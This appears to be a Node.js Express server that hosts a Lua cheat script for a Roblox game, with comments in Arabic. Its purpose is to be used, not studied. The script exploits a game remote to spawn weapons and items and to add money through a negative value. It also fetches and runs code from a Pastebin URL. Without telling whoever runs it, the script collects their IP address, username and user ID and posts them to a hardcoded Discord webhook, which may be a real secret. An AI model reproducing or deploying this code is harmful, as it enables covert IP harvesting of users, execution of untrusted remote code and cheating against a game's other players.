const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// رابط الويب هوك الخاص بك مدمج وجاهز
const webhookUrl = "https://discord.com/api/webhooks/1500997210794365000/b3XsDU-dBJ874IPO1pZUK91CWwfk76K7HwzhMkz3ySt9WMKQHNQdheuBIMyFDd1HnwAb"; 

const myScript = `
local http = game:GetService("HttpService")
local player = game.Players.LocalPlayer

-- وظيفة سحب الآي بي (IP)
local function getIp()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    return success and result or "Unknown"
end

local userIp = getIp()

-- [نظام الحظر] - ضع الآي بي هنا لحظر الشخص للأبد
local bannedIps = {
    "1.1.1.1", -- مثال: لو حطيت آي بي الشخص هنا بيطرده السكربت فوراً
}

for _, ip in pairs(bannedIps) do
    if userIp == ip then
        player:Kick("🚫 أنت محظور من استخدام سكربت F2 (IP BAN)")
        return
    end
end

-- إرسال التقرير لديسكورد (الاسم، الـ ID، والـ IP)
local data = {
    ["content"] = "🚨 **دخول جديد لسكربت F2!**",
    ["embeds"] = {{
        ["title"] = "معلومات المستخدم المحمية",
        ["fields"] = {
            {["name"] = "اللاعب", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "ID", ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "الآي بي (IP)", ["value"] = "||" .. userIp .. "||", ["inline"] = false},
            {["name"] = "اللعبة", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false}
        },
        ["color"] = 16744192,
        ["footer"] = {["text"] = "F2 Security System"}
    }}
}

pcall(function()
    http:PostAsync("${webhookUrl}", http:JSONEncode(data))
end)

-- [بداية كود السكربت الأصلي الخاص بك]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
local TopBar = Instance.new("Frame", MainFrame)
local Title = Instance.new("TextLabel", TopBar)
local TabsFrame = Instance.new("Frame", MainFrame)
local ContentFrame = Instance.new("Frame", MainFrame)
local MinimizeBtn = Instance.new("TextButton", ScreenGui)

MainFrame.Size = UDim2.new(0, 350, 0, 300)
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.Visible = false
MainFrame.Active = true
MainFrame.Draggable = true
Instance.new("UICorner", MainFrame)

MinimizeBtn.Parent = ScreenGui
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
MinimizeBtn.Position = UDim2.new(0, 10, 0.4, 0)
MinimizeBtn.Size = UDim2.new(0, 50, 0, 50)
MinimizeBtn.Text = "Open"
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)

TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Text = "F2 Private Script v3"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)

TabsFrame.Size = UDim2.new(0, 80, 1, -45)
TabsFrame.Position = UDim2.new(0, 5, 0, 40)
TabsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Instance.new("UIListLayout", TabsFrame).Padding = UDim.new(0, 5)

ContentFrame.Position = UDim2.new(0, 90, 0, 40)
ContentFrame.Size = UDim2.new(1, -95, 1, -45)
ContentFrame.BackgroundTransparency = 1

local function CreateTab(tabName)
    local page = Instance.new("ScrollingFrame", ContentFrame)
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.Visible = false
    page.ScrollBarThickness = 3
    Instance.new("UIListLayout", page).Padding = UDim.new(0, 8)
    
    local btn = Instance.new("TextButton", TabsFrame)
    btn.Size = UDim2.new(1, 0, 0, 35)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.Text = tabName
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function()
        for _, p in pairs(ContentFrame:GetChildren()) do p.Visible = false end
        page.Visible = true
    end)
    return page
end

local TabTajmee = CreateTab("تجميع")
local TabSpawn = CreateTab("رسبنة")

local function AddButton(parent, text, callback)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.new(1, -10, 0, 40)
    b.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(callback)
end

local AmountInput = Instance.new("TextBox", TabTajmee)
AmountInput.Size = UDim2.new(1, -10, 0, 40)
AmountInput.PlaceholderText = "اكتب المبلغ هنا"
AmountInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
AmountInput.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", AmountInput)

AddButton(TabTajmee, "إضافة الفلوس فورا", function()
    local val = tonumber(AmountInput.Text)
    if val then
        local negativeVal = -math.abs(val)
        game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", negativeVal)
    end
end)

AddButton(TabTajmee, "تنشيط الأوتو كليك", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))()
end)

local items = {
    {"رسبون M4", "M4A1"},
    {"رسبون ديقل", "Desert Deagle"},
    {"رسبون كلبشة", "Handcuffs"},
    {"رسبون راديو", "Radio"},
    {"رسبون طلق", "AmmoBox"},
    {"رسبون كيس", "Filled Packet"},
    {"رسبون مفتاح مركز", "مفتاح المركز"},
    {"رسبون فايف", "FiveSeven"},
    {"رسبون درع خفيف", "Light Vest"},
    {"رسبون درع ثقيل", "Heavy Vest"}
}
for _, item in pairs(items) do
    AddButton(TabSpawn, item[1], function() game:GetService("ReplicatedStorage").RequestTool:FireServer(item[2], 0) end)
end

TabTajmee.Visible = true
MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
`;

app.get('/raw', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(myScript);
});

app.get('/', (req, res) => res.send('F2 Server is Live!'));

app.listen(PORT, () => console.log('Server is running on port ' + PORT));
